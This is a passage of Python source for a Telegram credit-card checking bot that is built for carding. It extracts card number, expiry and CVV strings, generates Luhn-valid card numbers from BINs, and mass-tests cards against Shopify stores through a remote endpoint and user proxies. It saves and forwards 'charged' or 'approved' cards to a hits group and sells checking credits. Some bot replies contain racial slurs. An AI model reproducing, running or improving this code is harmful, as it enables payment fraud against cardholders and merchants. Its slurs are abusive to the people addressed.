                            print(f"⚠️ Proxy dead on attempt {attempt + 1}, retrying...")
                            await asyncio.sleep(1)  # Reduced from 2s to 1s
                            continue
                        return json_data
                    else:
                        # Debug: Print why JSON extraction failed
                        print(f"[DEBUG] JSON extraction failed (specific). Raw: {response_text[:500]}")
                        if attempt < max_retries - 1:
                            await asyncio.sleep(0.5)  # Reduced from 1s to 0.5s
                            continue
                        return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}
        except asyncio.TimeoutError:
            if attempt < max_retries - 1:
                print(f"⚠️ Timeout on attempt {attempt + 1}, retrying...")
                await asyncio.sleep(1)  # Reduced from 2s to 1s
                continue
            return {"Response": "Request Timeout", "Price": "-", "Gateway": "-"}
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"⚠️ Error on attempt {attempt + 1}: {str(e)}, retrying...")
                await asyncio.sleep(1)  # Reduced from 2s to 1s
                continue
            return {"Response": str(e), "Price": "-", "Gateway": "-"}
    
    # If all retries failed
    return {"Response": "All retries failed", "Price": "-", "Gateway": "-"}

def extract_card(text):
    if not text:
        return None
    
    # Try standard format first: 1234567890123456|12|2025|123
    match = re.search(r'(\d{13,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        mm = mm.zfill(2)  # Ensure 2 digits
        result = f"{cc}|{mm}|{yy}|{cvv}"
        print(f"[EXTRACT] Standard format: {result}")
        return result
    
    # Try multi-line format: card number on one line, CVV and EXP on separate lines
    # Example:
    # 5524860201184739
    # CVV: 275
    # EXP: 05/2028
    cc_match = re.search(r'\b(\d{13,16})\b', text)
    if cc_match:
        cc = cc_match.group(1)
        
        # Look for CVV (more flexible patterns)
        cvv_match = re.search(r'(?:CVV|CVC|CVV2|CODE)[\s:]*(\d{3,4})', text, re.IGNORECASE)
        if not cvv_match:
            # Try just finding 3-4 digits after card number
            cvv_match = re.search(r'\b(\d{3,4})\b', text[text.find(cc)+len(cc):])
        cvv = cvv_match.group(1) if cvv_match else None
        
        # Look for expiry date in various formats
        # MM/YYYY, MM/YY, YYYY/MM, YY/MM, MM-YYYY, etc.
        exp_match = re.search(r'(?:EXP|EXPIRY|EXPIRATION|VALID|DATE)[\s:]*(\d{2})[/\s-]+(\d{2,4})', text, re.IGNORECASE)
        if not exp_match:
            # Try without label: just MM/YYYY or MM/YY pattern
            exp_match = re.search(r'\b(\d{2})[/\s-]+(\d{2,4})\b', text)
        
        if exp_match:
            part1, part2 = exp_match.groups()
            # Determine which is month and which is year
            if len(part2) == 4 or (part2.isdigit() and int(part2) > 12):  # part2 is year
                mm, yy = part1, part2
            elif len(part1) == 4 or (part1.isdigit() and int(part1) > 12):  # part1 is year
                yy, mm = part1, part2
            else:
                mm, yy = part1, part2  # Default: assume MM/YY
            
            if len(yy) == 4:
                yy = yy[2:]
            
            mm = mm.zfill(2)  # Ensure 2 digits
            
            if cvv:
                result = f"{cc}|{mm}|{yy}|{cvv}"
                print(f"[EXTRACT] Multi-line format: {result}")
                return result
            else:
                print(f"[EXTRACT] Found card {cc}, exp {mm}/{yy}, but NO CVV")
        else:
            print(f"[EXTRACT] Found card {cc}, but NO EXP")
        
        # If we found card but not complete info, try normalize_card as fallback
        if cc:
            result = normalize_card(text)
            if result:
                print(f"[EXTRACT] Normalized: {result}")
                return result
    
    # Last resort: try normalize_card
    result = normalize_card(text)
    print(f"[EXTRACT] Final normalize: {result}")
    return result

def extract_all_cards(text):
    cards = set()
    
    # First try to extract from full text (for multi-line format)
    card = extract_card(text)
    if card and '|' in card:
        cards.add(card)
    
    # Then try line by line (for standard format)
    for line in text.splitlines():
        card = extract_card(line)
        if card and '|' in card:
            cards.add(card)
    
    return list(cards)

async def show_loading_animation(event):
    """Display frame-by-frame loading animation"""
    frames = [
        "```𝙈𝙖𝙨𝙨```",
        "```𝙈𝙖𝙨𝙨 𝙨𝙝𝙤𝙥𝙞𝙛𝙮```",
        "```𝙈𝙖𝙨𝙨 𝙨𝙝𝙤𝙥𝙞𝙛𝙮 𝙘𝙝𝙖𝙧𝙜𝙚$✅```"
    ]
    
    msg = await event.reply(frames[0], link_preview=False)
    await asyncio.sleep(0.5)
    
    for frame in frames[1:]:
        await msg.edit(frame)
        await asyncio.sleep(0.5)
    
    return msg

async def can_use(user_id, chat):
    # Get proper chat ID (Telegram supergroups need -100 prefix)
    chat_id = chat.id
    if chat_id > 0:
        # If positive, add -100 prefix for supergroups
        chat_id = int(f"-100{chat_id}")
    
    print(f"[CAN_USE] Called for user {user_id} in chat {chat.id} (normalized: {chat_id})")
    print(f"[CAN_USE] GROUP_ID = {GROUP_ID}")
    print(f"[CAN_USE] Comparison: chat_id == GROUP_ID? {chat_id == GROUP_ID}")
    print(f"[CAN_USE] Comparison: chat.id == GROUP_ID? {chat.id == GROUP_ID}")
    
    if await is_banned_user(user_id):
        return False, "banned"

    # Check if it's the main group - allow free access
    if chat_id == GROUP_ID or chat.id == GROUP_ID:
        print(f"[CAN_USE] ✅ Chat {chat_id} is main group - allowing free access")
        return True, "main_group_free"
    
    print(f"[CAN_USE] ⚠️ Chat {chat_id} is NOT main group, checking premium status...")
    
    # Check credit system - only Free and VIP plans
    user_data = await get_user_credits(user_id)
    credits = user_data.get('credits', 0)
    plan = user_data.get('plan', 'Free')
    
    is_private = chat.id == user_id

    if is_private:
        # In private chat, user needs credits to use bot
        if credits > 0 or user_id in ADMIN_ID:
            if plan == "VIP":
                return True, "vip_private"
            else:
                return True, "free_private"
        else:
            return False, "no_access"
    else:  # In a group
        # In group, everyone can use if they have credits
        if credits > 0 or user_id in ADMIN_ID:
            if plan == "VIP":
                return True, "vip_group"
            else:
                return True, "group_free"
        else:
            return False, "no_access"  # No credits in non-main group

def get_cc_limit(access_type, user_id=None):
    # Check if user is admin first
    if user_id and user_id in ADMIN_ID:
        return 50  # Admin limit 50
    if access_type == "main_group_free":
        return 15  # Main group gets 15 cards (no credit deduction)
    if access_type in ["vip_private", "vip_group"]:
        return 15  # VIP gets 15 cards
    elif access_type in ["group_free", "free_private"]:
        return 15  # Free gets 15 cards
    return 15  # Default to 15 for all users with credits

def get_mtxt_cc_limit(access_type, user_id=None):
    # Updated limits for /mtxt command - Free and VIP only
    if user_id and user_id in ADMIN_ID:
        return 999999  # Unlimited for admin
    if access_type == "main_group_free":
        return 500  # Main group gets 500 cards (no credit deduction)
    if access_type in ["vip_private", "vip_group"]:
        return 500  # VIP plan gets 500 CCs
    elif access_type in ["free_private", "group_free"]:
        return 0  # Free plan cannot use /mtxt
    return 0

# === CARD GENERATOR FUNCTIONS ===

COUNTRY_FLAGS = {
    "UNITED STATES": "🇺🇸", "CANADA": "🇨🇦", "UNITED KINGDOM": "🇬🇧", "GERMANY": "🇩🇪",
    "FRANCE": "🇫🇷", "ITALY": "🇮🇹", "SPAIN": "🇪🇸", "AUSTRALIA": "🇦🇺", "INDIA": "🇮🇳",
    "CHINA": "🇨🇳", "JAPAN": "🇯🇵", "BRAZIL": "🇧🇷", "MEXICO": "🇲🇽", "RUSSIA": "🇷🇺",
    "SOUTH AFRICA": "🇿🇦", "ARGENTINA": "🇦🇷", "NETHERLANDS": "🇳🇱", "SWITZERLAND": "🇨🇭",
    "SWEDEN": "🇸🇪", "NORWAY": "🇳🇴", "DENMARK": "🇩🇰", "FINLAND": "🇫🇮", "BELGIUM": "🇧🇪",
    "AUSTRIA": "🇦🇹", "POLAND": "🇵🇱", "TURKEY": "🇹🇷", "SAUDI ARABIA": "🇸🇦", 
    "UNITED ARAB EMIRATES": "🇦🇪", "SINGAPORE": "🇸🇬", "MALAYSIA": "🇲🇾", "THAILAND": "🇹🇭",
    "INDONESIA": "🇮🇩", "PHILIPPINES": "🇵🇭", "VIETNAM": "🇻🇳", "PAKISTAN": "🇵🇰",
    "BANGLADESH": "🇧🇩", "EGYPT": "🇪🇬", "NIGERIA": "🇳🇬", "KENYA": "🇰🇪",
}

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n) if d.isdigit()]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_credit_card(bin_number):
    card_length = 15 if bin_number.startswith(('34', '37')) else 16
    bin_number = ''.join(str(random.randint(0, 9)) if x == 'x' else x for x in bin_number)
    card_number = [int(x) for x in bin_number]
    
    # Truncate if too long, pad if too short to exactly card_length - 1
    if len(card_number) > (card_length - 1):
        card_number = card_number[:card_length - 1]
    while len(card_number) < (card_length - 1):
        card_number.append(random.randint(0, 9))
    
    # Calculate and append checksum digit
    checksum_digit = luhn_checksum(card_number + [0])
    if checksum_digit != 0:
        checksum_digit = 10 - checksum_digit
    card_number.append(checksum_digit)
    return ''.join(map(str, card_number))

def generate_expiry_date(mm_input, yy_input):
    mm = ''.join(str(random.randint(0, 9)) if x == 'x' else x for x in mm_input)
    if not mm:
        mm = f"{random.randint(1, 12):02d}"
    mm = f"{random.randint(1, 12):02d}" if int(mm) < 1 or int(mm) > 12 else mm
    mm = f"{int(mm):02d}"
    yy = ''.join(str(random.randint(0, 9)) if x == 'x' else x for x in yy_input)
    if not yy:
        yy = str(random.randint(26, 32))
    elif len(yy) == 2:
        yy = "20" + yy
    yy = str(random.randint(2026, 2032)) if int(yy) < 2026 or int(yy) > 2032 else yy
    return mm, yy

def generate_cvv(cvv_input, bin_number):
    if cvv_input.lower() != "rnd" and 'x' not in cvv_input:
        return cvv_input
    cvv_length = 4 if bin_number.startswith(('34', '37')) else 3
    return ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))

async def lookup_bin(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number[:6]}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    bin_data = await response.json()
                    country_name = bin_data.get('country_name', 'NOT FOUND').upper()
                    country_flag = bin_data.get('country_flag', '🏳️')
                    return {
                        "bank": bin_data.get('bank', 'N/A').upper(),
                        "card_type": bin_data.get('type', 'N/A').upper(),
                        "network": bin_data.get('brand', 'N/A').upper(),
                        "tier": bin_data.get('level', 'N/A').upper(),
                        "category": bin_data.get('category', 'N/A').upper(),
                        "country": country_name,
                        "flag": country_flag
                    }
                else:
                    return {"error": f"API error: {response.status}"}
    except Exception as e:
        return {"error": str(e)}

# === END CARD GENERATOR FUNCTIONS ===

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

async def forward_to_hits_group(card, response, gateway, price, site_index, user_id, command_name="mtxt"):
    """
    Forward Thank you or INCORRECT_ZIP responses to Hits Group chat instantly
    """
    try:
        # Check if FORWARD_ID is properly configured
        if not FORWARD_ID:
            print("FORWARD_ID not configured properly")
            return
            
        if not response:
            return
            
        response_lower = response.lower()
        
        # Check if response contains Thank you or any approved status
        if "thank you" in response_lower or any(key in response_lower for key in ["incorrect_zip", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved"]):
            
            print(f"🎯 HIT DETECTED! Forwarding to Hits Group...")
            print(f"Card: {card}")
            print(f"Response: {response}")
            
            # Get user info
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name or "Unknown"
                username = f"@{user.username}" if user.username else "No Username"
            except Exception as e:
                print(f"Error getting user info: {e}")
                user_name = "Unknown"
                username = "No Username"
            
            # Check if user has proxy
            proxy_url = get_proxy(user_id)
            proxy_status = "✅ Working Proxy" if proxy_url else "❌ No Proxy"
            
            # Get BIN info for forward message
            try:
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            except:
                brand = bin_type = level = bank = country = flag = "Unknown"
            
            # Determine status display
            if "thank you" in response.lower() or "payment successful" in response.lower():
                status_display = "Charged 💎"
            else:
                status_display = "APPROVED ✅"
            
            # Dynamic header based on price
            if price and price != "-":
                # Remove $ from price if present
                clean_price = str(price).replace('$', '')
                header_tag = f"#Shopify_{clean_price}$"
            else:
                header_tag = "#Auto_Shopify"
            
            # Create forward message with dynamic command name
            forward_msg = f"""```
✦ [/{command_name}] [ {header_tag} ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {response}
**Price** → {price} 💸
**Gateway** → {gateway}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}
👤 User: {user_name} ({username})
🆔 User ID: {user_id}"""

            # Forward to Hits Group
            try:
                await client.send_message(FORWARD_ID, forward_msg, parse_mode='Markdown', link_preview=False)
                print(f"✅ Successfully forwarded hit to group: {FORWARD_ID}")
            except Exception as e:
                print(f"❌ Error sending message to hits group: {e}")
        else:
            print(f"❌ No hit detected. Response: {response}")
            
    except Exception as e:
        print(f"❌ Error in forward_to_hits_group: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        "receipt id is empty", "handle is empty", "product id is empty", "tax amount is empty",
        "payment method identifier is empty", "invalid url", "error in 1st req", "error in 1 req", "cloudflare", "failed",
        "connection failed", "timed out", "access denied", "tlsv1 alert", "ssl routines",
        "could not resolve", "domain name not found", "name or service not known",
        "openssl ssl_connect", "empty reply from server",
        "client token", "clinte token", "del amount empty", "del ammount empty",
        "r4 token empty", "r2 id empty", "py id empty"
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, card="4031630422575208|01|2030|280"):
    try:
        # Parse card: cc|mes|ano|cvv
        parts = card.split("|")
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        url = f"https://php-bdad6.wasmer.app?cc={cc}|{mes}|{ano}|{cvv}&site={site}"
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"status": "dead", "response": f"SITE {res.status}", "site": site, "price": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if not json_data: return {"status": "dead", "response": "Invalid JSON", "site": site, "price": "-"}
                response_msg = json_data.get("Response", "")
                price = json_data.get("Price", "-")
                if is_site_dead(response_msg): return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else: return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e: return {"status": "dead", "response": str(e), "site": site, "price": "-"}

# Clean up locked session files on startup
import glob
for session_file in glob.glob('cc_bot.session*'):
    try:
        os.remove(session_file)
        print(f"🗑️ Removed old session file: {session_file}")
    except:
        pass

# Also clean up any .session files
for session_file in glob.glob('*.session*'):
    try:
        os.remove(session_file)
        print(f"🗑️ Removed session file: {session_file}")
    except:
        pass

client = TelegramClient('cc_bot', API_ID, API_HASH)

# === FEEDBACK BOT HANDLERS ===
FEEDBACK_PENDING_FILE = "feedback_pending.json"
FEEDBACK_ADMIN_IDS = [562735329, 6524790432]
feedback_pending = {}


async def load_feedback_pending():
    global feedback_pending
    try:
        if os.path.exists(FEEDBACK_PENDING_FILE):
            async with aiofiles.open(FEEDBACK_PENDING_FILE, "r") as f:
                content = await f.read()
                feedback_pending = json.loads(content) if content.strip() else {}
        else:
            feedback_pending = {}
    except Exception as e:
        print(f"Error loading feedback pending: {e}")
        feedback_pending = {}

async def save_feedback_pending():
    try:
        async with aiofiles.open(FEEDBACK_PENDING_FILE, "w") as f:
            await f.write(json.dumps(feedback_pending, indent=2))
    except Exception as e:
        print(f"Error saving feedback pending: {e}")

@client.on(events.NewMessage(pattern=r'^/fstart$'))
@require_membership
async def feedback_start(event):
    """Feedback bot start command"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    buttons = [
        [Button.url("📢 Visit Channel", "https://t.me/+Y2QWCIycJPplMDE1")]
    ]
    welcome_text = (
        "**Welcome to 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 #𝙎𝙃𝙊𝙋𝙄𝙁𝙔 Bot! 📸**\n\n"
        "💡 **How to Submit Feedback:**\n"
        "1️⃣ Send your best hits screenshot 💥\n"
        "2️⃣ Add the caption ➡️ `#shopify`\n"
        "3️⃣ Reply to that photo with **/f** 🧾\n\n"
        "🕒 After admin approval, your feedback will post in the channel! 🚀"
    )
    await event.reply(welcome_text, buttons=buttons, link_preview=False)

@client.on(events.NewMessage(pattern=r'^/f$'))
@require_membership
async def feedback_command(event):
    """Submit feedback with photo"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    if event.is_private:
        buttons = [[Button.url("Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        await event.reply("Use this command in the group.", buttons=buttons, link_preview=False)
        return
    
    photo_msg = await event.get_reply_message() if event.is_reply else event
    
    if not photo_msg or not photo_msg.photo:
        await event.reply("📸 Please send or reply to a photo with caption\n`#shopify` before using /f.", link_preview=False)
        return
    
    if event.is_reply and photo_msg.sender_id != event.sender_id:
        await event.reply("Nigga 🫣 This isn't your photo! You can only submit feedback for your own post.", link_preview=False)
        return
    
    caption = (photo_msg.message or "").lower()
    if "#shopify" not in caption:
        await event.reply("📸 Please send or reply to a photo with caption\n`#shopify` before using /f.", link_preview=False)
        return
    
    item_id = str(uuid.uuid4())
    sender = await event.get_sender()
    user_name = f"{sender.first_name} (@{sender.username})" if sender.username else sender.first_name
    
    feedback_pending[item_id] = {
        "file_id": photo_msg.photo.id,
        "user_id": event.sender_id,
        "user_name": user_name,
        "caption": photo_msg.message or "",
        "from_chat_id": event.chat_id,
        "orig_message_id": photo_msg.id,
    }
    await save_feedback_pending()
    
    buttons = [
        [
            Button.inline("✅ Approve", data=f"fapprove:{item_id}"),
            Button.inline("❌ Reject", data=f"freject:{item_id}"),
        ]
    ]
    
    success_count = 0
    for admin_id in FEEDBACK_ADMIN_IDS:
        try:
            await client.send_file(
                admin_id,
                photo_msg.photo,
                caption=f"🆕 **New feedback pending**\nFrom: {user_name}\n\nCaption:\n{photo_msg.message or '(no caption)'}",
                buttons=buttons
            )
            success_count += 1
        except Exception as e:
            print(f"Failed to send to admin {admin_id}: {e}")
    
    if success_count == 0:
        await event.reply("⚠️ Failed to send approval request to any admin. Please contact support.", link_preview=False)
        return
    
    await event.reply("✅ Your feedback has been submitted for admin approval!", link_preview=False)

@client.on(events.CallbackQuery(pattern=r'^(fapprove|freject):'))
async def feedback_callback_handler(event):
    """Handle approve/reject callbacks for feedback"""
    data = event.data.decode('utf-8')
    action, item_id = data.split(":", 1)
    user_id = event.sender_id
    
    if user_id not in FEEDBACK_ADMIN_IDS:
        await event.answer("❌ Only admins can approve or reject feedback.", alert=True)
        return
    
    item = feedback_pending.get(item_id)
    if not item:
        await event.answer("This feedback request no longer exists.", alert=True)
        return
    
    if action == "fapprove":
        post_caption = f"{item.get('caption', '')}\n```📸 Feedback by: {item.get('user_name')}```"
        try:
            photo_msg = await client.get_messages(item["from_chat_id"], ids=item["orig_message_id"])
            await client.send_file(CHANNEL_ID, photo_msg.photo, caption=post_caption)
        except Exception as e:
            print(f"Failed to post to channel: {e}")
            await event.answer("❌ Failed to post to channel.", alert=True)
            return
        
        try:
            await client.send_message(item["user_id"], "✅ Your feedback was approved and posted to the channel!", link_preview=False)
        except Exception:
            pass
        
        await event.edit(
            f"✅ **Approved**\nFrom: {item.get('user_name')}\n\nCaption:\n{item.get('caption', '(no caption)')}"
        )
        feedback_pending.pop(item_id, None)
        await save_feedback_pending()
    
    elif action == "freject":
        try:
            await client.send_message(item["user_id"], "❌ Your feedback was not approved by the admin.", link_preview=False)
        except Exception:
            pass
        
        await event.edit(
            f"❌ **Rejected**\nFrom: {item.get('user_name')}\n\nCaption:\n{item.get('caption', '(no caption)')}"
        )
        feedback_pending.pop(item_id, None)
        await save_feedback_pending()
    
    await event.answer()

# === Broadcast Handlers (English) ===

BROADCAST_FILE = "broadcasts.json"

async def ensure_broadcast_file():
    if not os.path.exists(BROADCAST_FILE):
        async with aiofiles.open(BROADCAST_FILE, "w") as f:
            await f.write(json.dumps({}))

async def load_broadcasts():
    await ensure_broadcast_file()
    try:
        async with aiofiles.open(BROADCAST_FILE, "r") as f:
            content = await f.read()
            return json.loads(content) if content.strip() else {}
    except Exception:
        return {}

async def save_broadcasts(data):
    async with aiofiles.open(BROADCAST_FILE, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def collect_all_user_ids():
    user_ids = set()
    for varname in ("PREMIUM_FILE", "FREE_FILE", "SITE_FILE"):
        try:
            fname = globals().get(varname)
            if not fname or not os.path.exists(fname):
                continue
            async with aiofiles.open(fname, "r") as f:
                txt = await f.read()
                if not txt.strip():
                    continue
                data = json.loads(txt)
                if isinstance(data, dict):
                    for k in data.keys():
                        try:
                            user_ids.add(int(k))
                        except:
                            pass
        except Exception:
            pass
    # Don't remove admins - they should also receive broadcasts
    return list(user_ids)

@client.on(events.NewMessage(pattern=r'(?i)^/b(?:\s+|$)'))
async def cmd_broadcast(event):
    try:
        if event.sender_id not in ADMIN_ID:
            return await event.reply("```🚫 Nigga Only admins can run this command.```", link_preview=False)

        is_reply = bool(event.reply_to_msg_id)
        text_to_send = None
        message_to_forward = None

        if is_reply:
            replied = await event.get_reply_message()
            if not replied:
                return await event.reply("❌ Could not fetch the replied message.", link_preview=False)
            if replied.media:
                message_to_forward = replied
            else:
                text_to_send = replied.text or replied.message or ""
                if not text_to_send:
                    return await event.reply("❌ The replied message contains nothing to send.", link_preview=False)
        else:
            parts = event.raw_text.split(None, 1)
            if len(parts) == 1:
                return await event.reply("❌ Provide a message to broadcast or reply to a message and use /b.\nExample: /b Hello everyone", link_preview=False)
            text_to_send = parts[1].strip()
            if not text_to_send:
                return await event.reply("❌ Message is empty.", link_preview=False)

        recipients = await collect_all_user_ids()
        total_targets = len(recipients)
        if total_targets == 0:
            return await event.reply("❌ No recipients found to broadcast to.", link_preview=False)

        status_msg = await event.reply(f"📡 Starting broadcast to {total_targets} users. Please wait...", link_preview=False)
        broadcast_key = f"{int(time.time())}_{event.id}"
        stored = []

        success = 0
        failed = 0

        semaphore = asyncio.Semaphore(8)

        async def send_to_user(user_id):
            nonlocal success, failed, stored
            async with semaphore:
                try:
                    if message_to_forward:
                        sent = await client.forward_messages(entity=user_id, messages=message_to_forward, from_peer=message_to_forward.chat_id)
                    else:
                        sent = await client.send_message(user_id, text_to_send, link_preview=False)
                    if isinstance(sent, list):
                        for m in sent:
                            stored.append({"chat_id": user_id, "msg_id": m.id})
                    else:
                        stored.append({"chat_id": user_id, "msg_id": sent.id})
                    success += 1
                except Exception:
                    failed += 1

        tasks = [asyncio.create_task(send_to_user(uid)) for uid in recipients]
        await asyncio.gather(*tasks)

        broadcasts = await load_broadcasts()
        broadcasts[broadcast_key] = {
            "admin": event.sender_id,
            "time": int(time.time()),
            "total_targets": total_targets,
            "succeeded": success,
            "failed": failed,
            "messages": stored
        }
        await save_broadcasts(broadcasts)

        summary = (
            f"```✅ Broadcast completed!```"
            f"Broadcast ID: `{broadcast_key}`\n"
            f"Targeted: {total_targets}\n"
            f"Succeeded: {success}\n"
            f"Failed: {failed}\n"
            f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        try:
            await status_msg.edit(summary)
        except:
            await event.reply(summary, link_preview=False)

    except Exception as e:
        tb = traceback.format_exc()
        try:
            await event.reply(f"❌ Error during broadcast: {e}\n\n{tb}", link_preview=False)
        except:
            pass
@client.on(events.NewMessage(pattern=r'(?i)^/bdelete\s*$'))
async def cmd_bdelete_latest(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply("```🚫 Nigga Only admins can run this command.```", link_preview=False)
        return

    broadcasts = await load_broadcasts()
    if not broadcasts:
        await event.reply("⚠️ No broadcasts found to delete.", link_preview=False)
        return

    # Find the last (most recent) broadcast (NOT already deleted)
    # Broadcasts is a dict, key = "{timestamp}_{eventid}"
    # We'll sort by timestamp descending (primary), eventid descending (secondary)
    def broadcast_sort_key(k):
        # in format like: 1762209368_23681
        parts = str(k).split('_')
        try:
            return (int(parts[0]), int(parts[1]) if len(parts) > 1 else 0)
        except:
            return (0, 0)

    last_key = sorted(broadcasts.keys(), key=broadcast_sort_key, reverse=True)[0]
    to_delete = broadcasts[last_key].get("messages", [])
    total = len(to_delete)
    deleted = 0
    failed = 0

    semaphore = asyncio.Semaphore(8)

    async def delete_one(entry):
        nonlocal deleted, failed
        async with semaphore:
            try:
                await client.delete_messages(entity=entry["chat_id"], message_ids=entry["msg_id"])
                deleted += 1
            except Exception:
                failed += 1

    tasks = [asyncio.create_task(delete_one(e)) for e in to_delete]
    await asyncio.gather(*tasks)

    # Remove broadcast record after deletion
    try:
        del broadcasts[last_key]
        await save_broadcasts(broadcasts)
    except Exception:
        pass

    result_text = (
        f"```✅ Latest broadcast deleted!```"
        f"Broadcast ID: `{last_key}`\n"
        f"Total recorded: {total}\n"
        f"Deleted: {deleted}\n"
        f"Failed: {failed}\n"
    )

    await event.reply(result_text, link_preview=False)

# === END Broadcast Handlers ===

def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 [𝘼𝙆](https://t.me/Akbhai007)"

def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = "❌ Insufficient Credits!\n\n(Free check available in group)"
    buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")], [Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")]]
    return message, buttons

# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]cmds?$'))
async def cmd_command(event):
    """Show all gateway commands in a simple text format"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    
    commands_text = """**Shopify (Proxy Gateway)**

/psh - Check single CC with proxy
/pmsh - Mass check multiple CCs with proxy
/ptxt - Mass check from text file with proxy

**Proxy Management:**
• /setpx <proxy> - Set your proxy
• /getpx - View current proxy
• /delpx - Delete proxy

**Site Management:**
• /txturl <sites> - Add sites for txt checking
• /txtls - List all your sites
• /txtrm <site/index> - Remove site"""
    
    await event.reply(commands_text, link_preview=False)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)

    # Get user info
    user = await event.get_sender()
    user_name = user.first_name if user.first_name else f"@{user.username}" if user.username else "User"
    
    # Get user credits and plan
    user_data = await get_user_credits(event.sender_id)
    credits = user_data.get('credits', 0)
    plan = user_data.get('plan', 'Free')
    
    # Fast parallel registration check
    registration_status = "❌ Not Registered"
    if event.sender_id in ADMIN_ID:
        registration_status = "✅ Success"
    else:
        # Parallel check for faster response
        async def check_group():
            try:
                participant = await client.get_permissions(GROUP_ID, event.sender_id)
                return participant is not None
            except:
                return False
        
        async def check_channel():
            try:
                participant = await client.get_permissions(CHANNEL_ID, event.sender_id)
                return participant is not None
            except:
                return False
        
        # Run both checks in parallel
        group_joined, channel_joined = await asyncio.gather(check_group(), check_channel())
        
        if group_joined and channel_joined:
            registration_status = "✅ Success"
            # Give 100 credits to newly registered users
            if credits == 0 and plan == 'Free':
                await set_user_credits(event.sender_id, 100, "Free")
                credits = 100
    
    # Build message with credits
    plan_emoji = "💎" if plan == "VIP" else "🆓"
    text = f"★ꜱʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ★```\nName: {user_name}\nUser ID: {event.sender_id}\nRegistration: {registration_status}```\n**Plan:** {plan} {plan_emoji} | **Credits:** {credits} 💰"

    # Dynamic buttons
    if registration_status == "✅ Success":
        buttons = [
            [Button.inline("Commands", b"commands"), Button.inline("Tools", b"tools_cmds")],
            [Button.inline("Gates", b"gateways")],
            [Button.inline("Plans", b"plans_info"), Button.inline("Close", b"close")]
        ]
    else:
        buttons = [
            [Button.inline("Register", b"register")],
            [Button.inline("Commands", b"commands"), Button.inline("Tools", b"tools_cmds")],
            [Button.inline("Gates", b"gateways")],
            [Button.inline("Plans", b"plans_info")]
        ]

    # Send simple text message - FAST
    msg = await event.reply(text, buttons=buttons, link_preview=False)
    
    # Track message owner
